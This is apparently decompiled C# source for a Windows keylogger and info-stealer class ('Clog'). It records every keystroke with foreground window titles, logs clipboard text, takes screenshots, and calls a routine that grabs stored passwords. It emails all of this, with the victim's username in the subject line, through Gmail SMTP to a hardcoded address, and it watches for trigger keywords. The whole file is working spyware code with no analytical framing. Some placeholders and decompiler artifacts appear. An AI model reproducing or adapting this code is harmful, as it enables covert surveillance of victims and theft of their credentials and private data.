using System;
using System.Drawing;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Net.Mime;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

// Token: 0x02000006 RID: 6
[StandardModule]
internal sealed class Clog
{
	// Token: 0x0600005D RID: 93
	[DllImport("user32.dll")]
	public static extern short GetAsyncKeyState(Keys vKey);

	// Token: 0x0600005E RID: 94
	[DllImport("user32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
	public static extern short GetKeyState(int nVirtKey);

	// Token: 0x0600005F RID: 95
	[DllImport("user32.dll", SetLastError = true)]
	private static extern IntPtr GetForegroundWindow();

	// Token: 0x06000060 RID: 96
	[DllImport("user32.dll", EntryPoint = "GetWindowTextW")]
	private static extern int GetWindowText([In] IntPtr hWnd, [MarshalAs(UnmanagedType.LPWStr)] [Out] StringBuilder lpString, int nMaxCount);

	// Token: 0x06000061 RID: 97
	[DllImport("user32.dll")]
	private static extern int ToUnicodeEx(uint wVirtKey, uint wScanCode, byte[] lpKeyState, [MarshalAs(UnmanagedType.LPWStr)] [Out] StringBuilder pwszBuff, int cchBuff, uint wFlags, IntPtr dwhkl);

	// Token: 0x06000062 RID: 98
	[DllImport("user32.dll")]
	private static extern bool GetKeyboardState(byte[] lpKeyState);

	// Token: 0x06000063 RID: 99
	[DllImport("user32.dll", SetLastError = true)]
	private static extern int GetWindowThreadProcessId(IntPtr hwnd, ref int lpdwProcessId);

	// Token: 0x06000064 RID: 100
	[DllImport("user32.dll")]
	private static extern IntPtr GetKeyboardLayout(uint idThread);

	// Token: 0x06000065 RID: 101 RVA: 0x00007040 File Offset: 0x00005240
	public static bool GetCapslock()
	{
		return (Clog.GetKeyState(20) & 1) != 0;
	}

	// Token: 0x06000066 RID: 102 RVA: 0x0000705C File Offset: 0x0000525C
	public static bool GetShift()
	{
		return Clog.GetAsyncKeyState(Keys.ShiftKey) != 0;
	}

	// Token: 0x06000067 RID: 103 RVA: 0x00007078 File Offset: 0x00005278
	public static void Startclogging()
	{
		for (;;)
		{
			try
			{
				StringBuilder stringBuilder = new StringBuilder(256);
				Clog.GetWindowText(Clog.GetForegroundWindow(), stringBuilder, stringBuilder.Capacity);
				if (Operators.CompareString(Clog.windowtext, stringBuilder.ToString(), false) != 0)
				{
					Clog.windowtext = stringBuilder.ToString();
					Clog.logs.Append(Environment.NewLine + stringBuilder.ToString() + Environment.NewLine);
				}
				string text = Clog.logs.ToString();
				int num = 1;
				do
				{
					Clog.result = 0;
					Clog.result = (int)Clog.GetAsyncKeyState((Keys)num);
					if (Clog.result == -32767)
					{
						if (Clog.GetCapslock() & Clog.GetShift())
						{
							switch (num)
							{
							case 1:
								Clog.logs.Append(" [L-Click]");
								goto IL_748;
							case 2:
								Clog.logs.Append(" [R-Click]");
								goto IL_748;
							case 8:
								Clog.logs.Append("");
								goto IL_748;
							case 13:
								Clog.logs.Append(" [Enter]\r\n");
								goto IL_748;
							case 16:
								goto IL_748;
							case 17:
								Clog.logs.Append("");
								goto IL_748;
							case 18:
								Clog.logs.Append("");
								goto IL_748;
							case 20:
								goto IL_748;
							case 32:
								Clog.logs.Append(" ");
								goto IL_748;
							case 37:
							case 38:
							case 39:
							case 40:
								goto IL_748;
							case 46:
								Clog.logs.Append("[Del]");
								goto IL_748;
							case 48:
								Clog.logs.Append(")");
								goto IL_748;
							case 49:
								Clog.logs.Append("!");
								goto IL_748;
							case 50:
								Clog.logs.Append("@");
								goto IL_748;
							case 51:
								Clog.logs.Append("#");
								goto IL_748;
							case 52:
								Clog.logs.Append("$");
								goto IL_748;
							case 53:
								Clog.logs.Append("%");
								goto IL_748;
							case 54:
								Clog.logs.Append("^");
								goto IL_748;
							case 55:
								Clog.logs.Append("&");
								goto IL_748;
							case 56:
								Clog.logs.Append("*");
								goto IL_748;
							case 57:
								Clog.logs.Append("(");
								goto IL_748;
							case 64:
							case 65:
							case 66:
							case 67:
							case 68:
							case 69:
							case 70:
							case 71:
							case 72:
							case 73:
							case 74:
							case 75:
							case 76:
							case 77:
							case 78:
							case 79:
							case 80:
							case 81:
							case 82:
							case 83:
							case 84:
							case 85:
							case 86:
							case 87:
							case 88:
							case 89:
							case 90:
							{
								byte[] array = new byte[255];
								bool keyboardState = Clog.GetKeyboardState(array);
								StringBuilder stringBuilder2 = new StringBuilder();
								uint wVirtKey = (uint)num;
								uint wScanCode = (uint)num;
								byte[] lpKeyState = array;
								StringBuilder pwszBuff = stringBuilder2;
								int cchBuff = 5;
								uint wFlags = 0u;
								IntPtr foregroundWindow = Clog.GetForegroundWindow();
								int num2 = 0;
								Clog.ToUnicodeEx(wVirtKey, wScanCode, lpKeyState, pwszBuff, cchBuff, wFlags, Clog.GetKeyboardLayout((uint)Clog.GetWindowThreadProcessId(foregroundWindow, ref num2)));
								Clog.logs.Append(stringBuilder2.ToString());
								goto IL_748;
							}
							case 91:
								goto IL_748;
							case 97:
							case 98:
							case 99:
							case 100:
							case 101:
							case 102:
							case 103:
							case 104:
							case 105:
							case 106:
							case 107:
							case 108:
							case 109:
							case 110:
							case 111:
							case 112:
							case 113:
							case 114:
							case 115:
							case 116:
							case 117:
							case 118:
							case 119:
							case 120:
							case 121:
							case 122:
							{
								byte[] array2 = new byte[255];
								bool keyboardState2 = Clog.GetKeyboardState(array2);
								StringBuilder stringBuilder3 = new StringBuilder();
								uint wVirtKey2 = (uint)num;
								uint wScanCode2 = (uint)num;
								byte[] lpKeyState2 = array2;
								StringBuilder pwszBuff2 = stringBuilder3;
								int cchBuff2 = 5;
								uint wFlags2 = 0u;
								IntPtr foregroundWindow2 = Clog.GetForegroundWindow();
								int num2 = 0;
								Clog.ToUnicodeEx(wVirtKey2, wScanCode2, lpKeyState2, pwszBuff2, cchBuff2, wFlags2, Clog.GetKeyboardLayout((uint)Clog.GetWindowThreadProcessId(foregroundWindow2, ref num2)));
								Clog.logs.Append(stringBuilder3.ToString());
								goto IL_748;
							}
							case 160:
							case 161:
							case 162:
							case 163:
							case 164:
							case 165:
								goto IL_748;
							case 186:
								Clog.logs.Append(":");
								goto IL_748;
							case 187:
								Clog.logs.Append("+");
								goto IL_748;
							case 188:
								Clog.logs.Append("<");
								goto IL_748;
							case 189:
								Clog.logs.Append("_");
								goto IL_748;
							case 190:
								Clog.logs.Append(">");
								goto IL_748;
							case 191:
								Clog.logs.Append("?");
								goto IL_748;
							case 192:
								Clog.logs.Append("~");
								goto IL_748;
							case 219:
								Clog.logs.Append("{");
								goto IL_748;
							case 220:
								Clog.logs.Append("|");
								goto IL_748;
							case 221:
								Clog.logs.Append("}");
								goto IL_748;
							case 222:
								Clog.logs.Append("\"");
								goto IL_748;
							}
							Clog.logs.Append(" (" + num.ToString() + ") ");
						}
						IL_748:
						if (Clog.GetCapslock() & !Clog.GetShift())
						{
							switch (num)
							{
							case 1:
								Clog.logs.Append(" [L-Click]");
								goto IL_D54;
							case 2:
								Clog.logs.Append(" [R-Click]");
								goto IL_D54;
							case 8:
								Clog.logs.Append("");
								goto IL_D54;
							case 13:
								Clog.logs.Append(" [Enter]\r\n");
								goto IL_D54;
							case 16:
								goto IL_D54;
							case 17:
								Clog.logs.Append("");
								goto IL_D54;
							case 18:
								Clog.logs.Append("");
								goto IL_D54;
							case 20:
								goto IL_D54;
							case 32:
								Clog.logs.Append(" ");
								goto IL_D54;
							case 37:
							case 38:
							case 39:
							case 40:
								goto IL_D54;
							case 46:
								Clog.logs.Append("[Del]");
								goto IL_D54;
							case 48:
							case 49:
							case 50:
							case 51:
							case 52:
							case 53:
							case 54:
							case 55:
							case 56:
							case 57:
								Clog.logs.Append(Strings.ChrW(num));
								goto IL_D54;
							case 64:
							case 65:
							case 66:
							case 67:
							case 68:
							case 69:
							case 70:
							case 71:
							case 72:
							case 73:
							case 74:
							case 75:
							case 76:
							case 77:
							case 78:
							case 79:
							case 80:
							case 81:
							case 82:
							case 83:
							case 84:
							case 85:
							case 86:
							case 87:
							case 88:
							case 89:
							case 90:
							{
								byte[] array3 = new byte[255];
								bool keyboardState3 = Clog.GetKeyboardState(array3);
								StringBuilder stringBuilder4 = new StringBuilder();
								uint wVirtKey3 = (uint)num;
								uint wScanCode3 = (uint)num;
								byte[] lpKeyState3 = array3;
								StringBuilder pwszBuff3 = stringBuilder4;
								int cchBuff3 = 5;
								uint wFlags3 = 0u;
								IntPtr foregroundWindow3 = Clog.GetForegroundWindow();
								int num2 = 0;
								Clog.ToUnicodeEx(wVirtKey3, wScanCode3, lpKeyState3, pwszBuff3, cchBuff3, wFlags3, Clog.GetKeyboardLayout((uint)Clog.GetWindowThreadProcessId(foregroundWindow3, ref num2)));
								Clog.logs.Append(stringBuilder4.ToString());
								goto IL_D54;
							}
							case 91:
								goto IL_D54;
							case 97:
							case 98:
							case 99:
							case 100:
							case 101:
							case 102:
							case 103:
							case 104:
							case 105:
							case 106:
							case 107:
							case 108:
							case 109:
							case 110:
							case 111:
							case 112:
							case 113:
							case 114:
							case 115:
							case 116:
							case 117:
							case 118:
							case 119:
							case 120:
							case 121:
							case 122:
							{
								byte[] array4 = new byte[255];
								bool keyboardState4 = Clog.GetKeyboardState(array4);
								StringBuilder stringBuilder5 = new StringBuilder();
								uint wVirtKey4 = (uint)num;
								uint wScanCode4 = (uint)num;
								byte[] lpKeyState4 = array4;
								StringBuilder pwszBuff4 = stringBuilder5;
								int cchBuff4 = 5;
								uint wFlags4 = 0u;
								IntPtr foregroundWindow4 = Clog.GetForegroundWindow();
								int num2 = 0;
								Clog.ToUnicodeEx(wVirtKey4, wScanCode4, lpKeyState4, pwszBuff4, cchBuff4, wFlags4, Clog.GetKeyboardLayout((uint)Clog.GetWindowThreadProcessId(foregroundWindow4, ref num2)));
								Clog.logs.Append(stringBuilder5.ToString());
								goto IL_D54;
							}
							case 160:
							case 161:
							case 162:
							case 163:
							case 164:
							case 165:
								goto IL_D54;
							case 186:
								Clog.logs.Append(";");
								goto IL_D54;
							case 187:
								Clog.logs.Append("=");
								goto IL_D54;
							case 188:
								Clog.logs.Append(",");
								goto IL_D54;
							case 189:
								Clog.logs.Append("-");
								goto IL_D54;
							case 190:
								Clog.logs.Append(".");
								goto IL_D54;
							case 191:
								Clog.logs.Append("/");
								goto IL_D54;
							case 192:
								Clog.logs.Append("`");
								goto IL_D54;
							case 219:
								Clog.logs.Append("[");
								goto IL_D54;
							case 220:
								Clog.logs.Append("\\");
								goto IL_D54;
							case 221:
								Clog.logs.Append("]");
								goto IL_D54;
							case 222:
								Clog.logs.Append("'");
								goto IL_D54;
							}
							Clog.logs.Append(" (" + num.ToString() + ") ");
						}
						IL_D54:
						if (!Clog.GetCapslock() & Clog.GetShift())
						{
							switch (num)
							{
							case 1:
								Clog.logs.Append(" [L-Click]");
								goto IL_1419;
							case 2:
								Clog.logs.Append(" [R-Click]");
								goto IL_1419;
							case 8:
								Clog.logs.Append(" [<-] ");
								goto IL_1419;
							case 13:
								Clog.logs.Append(" [Enter]\r\n");
								goto IL_1419;
							case 16:
								goto IL_1419;
							case 17:
								Clog.logs.Append("");
								goto IL_1419;
							case 18:
								Clog.logs.Append("");
								goto IL_1419;
							case 20:
								goto IL_1419;
							case 32:
								Clog.logs.Append(" ");
								goto IL_1419;
							case 37:
							case 38:
							case 39:
							case 40:
								goto IL_1419;
							case 46:
								Clog.logs.Append("[Del]");
								goto IL_1419;
							case 48:
								Clog.logs.Append(")");
								goto IL_1419;
							case 49:
								Clog.logs.Append("!");
								goto IL_1419;
							case 50:
								Clog.logs.Append("@");
								goto IL_1419;
							case 51:
								Clog.logs.Append("#");
								goto IL_1419;
							case 52:
								Clog.logs.Append("$");
								goto IL_1419;
							case 53:
								Clog.logs.Append("%");
								goto IL_1419;
							case 54:
								Clog.logs.Append("^");
								goto IL_1419;
							case 55:
								Clog.logs.Append("&");
								goto IL_1419;
							case 56:
								Clog.logs.Append("*");
								goto IL_1419;
							case 57:
								Clog.logs.Append("(");
								goto IL_1419;
							case 64:
							case 65:
							case 66:
							case 67:
							case 68:
							case 69:
							case 70:
							case 71:
							case 72:
							case 73:
							case 74:
							case 75:
							case 76:
							case 77:
							case 78:
							case 79:
							case 80:
							case 81:
							case 82:
							case 83:
							case 84:
							case 85:
							case 86:
							case 87:
							case 88:
							case 89:
							case 90:
							{
								byte[] array5 = new byte[255];
								bool keyboardState5 = Clog.GetKeyboardState(array5);
								StringBuilder stringBuilder6 = new StringBuilder();
								uint wVirtKey5 = (uint)num;
								uint wScanCode5 = (uint)num;
								byte[] lpKeyState5 = array5;
								StringBuilder pwszBuff5 = stringBuilder6;
								int cchBuff5 = 5;
								uint wFlags5 = 0u;
								IntPtr foregroundWindow5 = Clog.GetForegroundWindow();
								int num2 = 0;
								Clog.ToUnicodeEx(wVirtKey5, wScanCode5, lpKeyState5, pwszBuff5, cchBuff5, wFlags5, Clog.GetKeyboardLayout((uint)Clog.GetWindowThreadProcessId(foregroundWindow5, ref num2)));
								Clog.logs.Append(stringBuilder6.ToString());
								goto IL_1419;
							}
							case 91:
								goto IL_1419;
							case 97:
							case 98:
							case 99:
							case 100:
							case 101:
							case 102:
							case 103:
							case 104:
							case 105:
							case 106:
							case 107:
							case 108:
							case 109:
							case 110:
							case 111:
							case 112:
							case 113:
							case 114:
							case 115:
							case 116:
							case 117:
							case 118:
							case 119:
							case 120:
							case 121:
							case 122:
							{
								byte[] array6 = new byte[255];
								bool keyboardState6 = Clog.GetKeyboardState(array6);
								StringBuilder stringBuilder7 = new StringBuilder();
								uint wVirtKey6 = (uint)num;
								uint wScanCode6 = (uint)num;
								byte[] lpKeyState6 = array6;
								StringBuilder pwszBuff6 = stringBuilder7;
								int cchBuff6 = 5;
								uint wFlags6 = 0u;
								IntPtr foregroundWindow6 = Clog.GetForegroundWindow();
								int num2 = 0;
								Clog.ToUnicodeEx(wVirtKey6, wScanCode6, lpKeyState6, pwszBuff6, cchBuff6, wFlags6, Clog.GetKeyboardLayout((uint)Clog.GetWindowThreadProcessId(foregroundWindow6, ref num2)));
								Clog.logs.Append(stringBuilder7.ToString());
								goto IL_1419;
							}
							case 160:
							case 161:
							case 162:
							case 163:
							case 164:
							case 165:
								goto IL_1419;
							case 186:
								Clog.logs.Append(":");
								goto IL_1419;
							case 187:
								Clog.logs.Append("+");
								goto IL_1419;
							case 188:
								Clog.logs.Append("<");
								goto IL_1419;
							case 189:
								Clog.logs.Append("_");
								goto IL_1419;
							case 190:
								Clog.logs.Append(">");
								goto IL_1419;
							case 191:
								Clog.logs.Append("?");
								goto IL_1419;
							case 192:
								Clog.logs.Append("~");
								goto IL_1419;
							case 219:
								Clog.logs.Append("{");
								goto IL_1419;
							case 220:
								Clog.logs.Append("|");
								goto IL_1419;
							case 221:
								Clog.logs.Append("}");
								goto IL_1419;
							case 222:
								Clog.logs.Append("\"");
								goto IL_1419;
							}
							Clog.logs.Append(" (" + num.ToString() + ") ");
						}
						IL_1419:
						if (!Clog.GetCapslock() & !Clog.GetShift())
						{
							switch (num)
							{
							case 1:
								Clog.logs.Append(" [L-Click]");
								goto IL_1A28;
							case 2:
								Clog.logs.Append(" [R-Click]");
								goto IL_1A28;
							case 8:
								Clog.logs.Append(" [<-] ");
								goto IL_1A28;
							case 13:
								Clog.logs.Append(" [Enter] \r\n");
								goto IL_1A28;
							case 16:
								goto IL_1A28;
							case 17:
								Clog.logs.Append("");
								goto IL_1A28;
							case 18:
								Clog.logs.Append("");
								goto IL_1A28;
							case 20:
								goto IL_1A28;
							case 32:
								Clog.logs.Append(" ");
								goto IL_1A28;
							case 37:
							case 38:
							case 39:
							case 40:
								goto IL_1A28;
							case 46:
								Clog.logs.Append("[Del]");
								goto IL_1A28;
							case 48:
							case 49:
							case 50:
							case 51:
							case 52:
							case 53:
							case 54:
							case 55:
							case 56:
							case 57:
								Clog.logs.Append(Strings.ChrW(num));
								goto IL_1A28;
							case 64:
							case 65:
							case 66:
							case 67:
							case 68:
							case 69:
							case 70:
							case 71:
							case 72:
							case 73:
							case 74:
							case 75:
							case 76:
							case 77:
							case 78:
							case 79:
							case 80:
							case 81:
							case 82:
							case 83:
							case 84:
							case 85:
							case 86:
							case 87:
							case 88:
							case 89:
							case 90:
							{
								byte[] array7 = new byte[255];
								bool keyboardState7 = Clog.GetKeyboardState(array7);
								StringBuilder stringBuilder8 = new StringBuilder();
								uint wVirtKey7 = (uint)num;
								uint wScanCode7 = (uint)num;
								byte[] lpKeyState7 = array7;
								StringBuilder pwszBuff7 = stringBuilder8;
								int cchBuff7 = 5;
								uint wFlags7 = 0u;
								IntPtr foregroundWindow7 = Clog.GetForegroundWindow();
								int num2 = 0;
								Clog.ToUnicodeEx(wVirtKey7, wScanCode7, lpKeyState7, pwszBuff7, cchBuff7, wFlags7, Clog.GetKeyboardLayout((uint)Clog.GetWindowThreadProcessId(foregroundWindow7, ref num2)));
								Clog.logs.Append(stringBuilder8.ToString());
								goto IL_1A28;
							}
							case 91:
								goto IL_1A28;
							case 97:
							case 98:
							case 99:
							case 100:
							case 101:
							case 102:
							case 103:
							case 104:
							case 105:
							case 106:
							case 107:
							case 108:
							case 109:
							case 110:
							case 111:
							case 112:
							case 113:
							case 114:
							case 115:
							case 116:
							case 117:
							case 118:
							case 119:
							case 120:
							case 121:
							case 122:
							{
								byte[] array8 = new byte[255];
								bool keyboardState8 = Clog.GetKeyboardState(array8);
								StringBuilder stringBuilder9 = new StringBuilder();
								uint wVirtKey8 = (uint)num;
								uint wScanCode8 = (uint)num;
								byte[] lpKeyState8 = array8;
								StringBuilder pwszBuff8 = stringBuilder9;
								int cchBuff8 = 5;
								uint wFlags8 = 0u;
								IntPtr foregroundWindow8 = Clog.GetForegroundWindow();
								int num2 = 0;
								Clog.ToUnicodeEx(wVirtKey8, wScanCode8, lpKeyState8, pwszBuff8, cchBuff8, wFlags8, Clog.GetKeyboardLayout((uint)Clog.GetWindowThreadProcessId(foregroundWindow8, ref num2)));
								Clog.logs.Append(stringBuilder9.ToString());
								goto IL_1A28;
							}
							case 160:
							case 161:
							case 162:
							case 163:
							case 164:
							case 165:
								goto IL_1A28;
							case 186:
								Clog.logs.Append(";");
								goto IL_1A28;
							case 187:
								Clog.logs.Append("=");
								goto IL_1A28;
							case 188:
								Clog.logs.Append(",");
								goto IL_1A28;
							case 189:
								Clog.logs.Append("-");
								goto IL_1A28;
							case 190:
								Clog.logs.Append(".");
								goto IL_1A28;
							case 191:
								Clog.logs.Append("/");
								goto IL_1A28;
							case 192:
								Clog.logs.Append("`");
								goto IL_1A28;
							case 219:
								Clog.logs.Append("[");
								goto IL_1A28;
							case 220:
								Clog.logs.Append("\\");
								goto IL_1A28;
							case 221:
								Clog.logs.Append("]");
								goto IL_1A28;
							case 222:
								Clog.logs.Append("'");
								goto IL_1A28;
							}
							Clog.logs.Append(" (" + num.ToString() + ") ");
						}
					}
					IL_1A28:
					num++;
				}
				while (num <= 225);
				Thread.Sleep(10);
			}
			catch (Exception ex)
			{
			}
		}
	}

	// Token: 0x06000068 RID: 104
	[DllImport("user32.dll")]
	private static extern IntPtr GetClipboardData(uint uFormat);

	// Token: 0x06000069 RID: 105
	[DllImport("user32.dll")]
	private static extern bool IsClipboardFormatAvailable(uint format);

	// Token: 0x0600006A RID: 106
	[DllImport("user32.dll", SetLastError = true)]
	private static extern bool OpenClipboard(IntPtr hWndNewOwner);

	// Token: 0x0600006B RID: 107
	[DllImport("user32.dll", SetLastError = true)]
	private static extern bool CloseClipboard();

	// Token: 0x0600006C RID: 108
	[DllImport("kernel32.dll")]
	private static extern IntPtr GlobalLock(IntPtr hMem);

	// Token: 0x0600006D RID: 109
	[DllImport("kernel32.dll")]
	private static extern bool GlobalUnlock(IntPtr hMem);

	// Token: 0x0600006E RID: 110 RVA: 0x00008AF4 File Offset: 0x00006CF4
	public static void Startclogging2()
	{
		string text = string.Empty;
		for (;;)
		{
			try
			{
				string clipboard = Clog.GetClipboard();
				if (Operators.CompareString(clipboard, text, false) != 0)
				{
					text = clipboard;
					Clog.logs2.AppendLine(text);
				}
				Thread.Sleep(1500);
			}
			catch (Exception ex)
			{
			}
		}
	}

	// Token: 0x0600006F RID: 111 RVA: 0x00008B50 File Offset: 0x00006D50
	public static string GetClipboard()
	{
		int num;
		string text2;
		int num4;
		object obj8;
		try
		{
			IL_00:
			ProjectData.ClearProjectError();
			num = 1;
			IL_08:
			int num2 = 2;
			if (Clog.IsClipboardFormatAvailable(13u))
			{
				goto IL_19;
			}
			IL_14:
			goto IL_19F;
			IL_19:
			num2 = 5;
			if (Clog.OpenClipboard(IntPtr.Zero))
			{
				goto IL_2D;
			}
			IL_28:
			goto IL_19F;
			IL_2D:
			num2 = 8;
			string text = null;
			IL_32:
			num2 = 9;
			object obj = Clog.GetClipboardData(13u);
			IL_43:
			num2 = 10;
			object obj2 = obj;
			IntPtr intPtr;
			if (!(((obj2 != null) ? ((IntPtr)obj2) : intPtr) != IntPtr.Zero))
			{
				goto IL_E5;
			}
			IL_66:
			num2 = 11;
			object obj3 = obj;
			object obj4 = Clog.GlobalLock((obj3 != null) ? ((IntPtr)obj3) : intPtr);
			IL_88:
			num2 = 12;
			object obj5 = obj4;
			if (!(((obj5 != null) ? ((IntPtr)obj5) : intPtr) != IntPtr.Zero))
			{
				goto IL_E5;
			}
			IL_AB:
			num2 = 13;
			object obj6 = obj4;
			text = Marshal.PtrToStringUni((obj6 != null) ? ((IntPtr)obj6) : intPtr);
			IL_C8:
			num2 = 14;
			object obj7 = obj4;
			Clog.GlobalUnlock((obj7 != null) ? ((IntPtr)obj7) : intPtr);
			IL_E5:
			num2 = 17;
			Clog.CloseClipboard();
			IL_EF:
			num2 = 18;
			text2 = text;
			IL_FA:
			goto IL_19F;
			IL_FF:
			int num3 = num4 + 1;
			num4 = 0;
			@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num3);
			IL_15B:
			goto IL_194;
			IL_15D:
			num4 = num2;
			@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num);
			IL_170:;
		}
		catch when (endfilter(obj8 is Exception & num != 0 & num4 == 0))
		{
			Exception ex = (Exception)obj9;
			goto IL_15D;
		}
		IL_194:
		throw ProjectData.CreateProjectError(-2146828237);
		IL_19F:
		string text3 = text2;
		if (num4 != 0)
		{
			ProjectData.ClearProjectError();
		}
		return text3;
	}

	// Token: 0x06000070 RID: 112 RVA: 0x00008D24 File Offset: 0x00006F24
	public static void Email()
	{
		try
		{
			if (Clog.emailpass)
			{
				Clog.SendEmail(InitalizePass.GrabAllPasswords(), Environment.UserName + ": PASSWORDS");
				Clog.emailpass = false;
			}
		}
		catch (Exception ex)
		{
		}
		for (;;)
		{
			try
			{
				Thread.Sleep(Conversions.ToInteger("EmailInterval"));
				Clog.SendEmail(Clog.logs.ToString(), null);
			}
			catch (Exception ex2)
			{
			}
		}
	}

	// Token: 0x06000071 RID: 113 RVA: 0x00008DB0 File Offset: 0x00006FB0
	public static void Email2()
	{
		for (;;)
		{
			try
			{
				Thread.Sleep(500);
				string[] array = new string[]
				{
					"REPLACETHESEKEYSTROKES"
				};
				int num = 0;
				int num2 = array.Length - 1;
				for (int i = num; i <= num2; i++)
				{
					if (Clog.windowtext.ToLower().Contains(array[i].ToLower()) | Clog.logs.ToString().Split(new char[]
					{
						'\r'
					})[Clog.logs.ToString().Split(new char[]
					{
						'\r'
					}).Length - 1].ToLower().Contains(array[i].ToLower()))
					{
						Clog.SendEmail(Clog.logs.ToString(), Environment.UserName + ": KEYWORD - " + array[i]);
						Thread.Sleep(3000);
					}
				}
			}
			catch (Exception ex)
			{
			}
		}
	}

	// Token: 0x06000072 RID: 114 RVA: 0x00008EAC File Offset: 0x000070AC
	public static void SendEmail(string emailbody, string CustomSubject = null)
	{
		try
		{
			string content = string.Empty;
			AlternateView alternateView = AlternateView.CreateAlternateViewFromString(content, null, "text/html");
			MailMessage mailMessage = new MailMessage();
			if (Server.screenlogs)
			{
				Clog.g = Graphics.FromImage(Clog.screenGrab);
				Graphics graphics = Clog.g;
				Point point = new Point(0, 0);
				Point upperLeftSource = point;
				Point upperLeftDestination = new Point(0, 0);
				graphics.CopyFromScreen(upperLeftSource, upperLeftDestination, Clog.screenSize);
				Clog.resize = new Bitmap(Clog.screenGrab, (int)Math.Round((double)Clog.screenGrab.Width / 1.5), (int)Math.Round((double)Clog.screenGrab.Height / 1.5));
				content = string.Concat(new string[]
				{
					"<img src=\"cid:companyLogo\" width=",
					Conversions.ToString(Clog.resize.Width),
					" height=",
					Conversions.ToString(Clog.resize.Height),
					"/> <br> <br>",
					emailbody
				});
				ImageConverter imageConverter = new ImageConverter();
				byte[] buffer = (byte[])imageConverter.ConvertTo(Clog.resize, typeof(byte[]));
				MemoryStream contentStream = new MemoryStream(buffer);
				LinkedResource linkedResource = new LinkedResource(contentStream, "image/jpeg");
				linkedResource.ContentId = "companyLogo";
				linkedResource.ContentType = new ContentType("image/jpg");
				alternateView.LinkedResources.Add(linkedResource);
			}
			else
			{
				content = emailbody;
			}
			mailMessage.AlternateViews.Add(alternateView);
			mailMessage.To.Add("keyloggerto@gmail.com");
			if (CustomSubject != null)
			{
				mailMessage.Subject = CustomSubject;
			}
			else
			{
				mailMessage.Subject = Environment.UserName + ": KeylogSubject";
			}
			mailMessage.From = new MailAddress("keylogger@gmail.com");
			ContentType contentType = new ContentType("text/html");
			AlternateView item = AlternateView.CreateAlternateViewFromString(content, contentType);
			mailMessage.AlternateViews.Add(item);
			new SmtpClient("smtp.gmail.com", 587)
			{
				UseDefaultCredentials = false,
				Credentials = new NetworkCredential("keylogger@gmail.com", "keyloggerpassword"),
				EnableSsl = true,
				DeliveryMethod = SmtpDeliveryMethod.Network
			}.Send(mailMessage);
		}
		catch (Exception ex)
		{
		}
	}

	// Token: 0x04000016 RID: 22
	public static StringBuilder logs = new StringBuilder();

	// Token: 0x04000017 RID: 23
	public static StringBuilder logs2 = new StringBuilder();

	// Token: 0x04000018 RID: 24
	private static int result;

	// Token: 0x04000019 RID: 25
	private static string windowtext = "";

	// Token: 0x0400001A RID: 26
	private static Size screenSize = new Size(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);

	// Token: 0x0400001B RID: 27
	private static Bitmap screenGrab = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);

	// Token: 0x0400001C RID: 28
	private static Bitmap resize = null;

	// Token: 0x0400001D RID: 29
	private static Graphics g;

	// Token: 0x0400001E RID: 30
	private static bool emailpass = false;
}
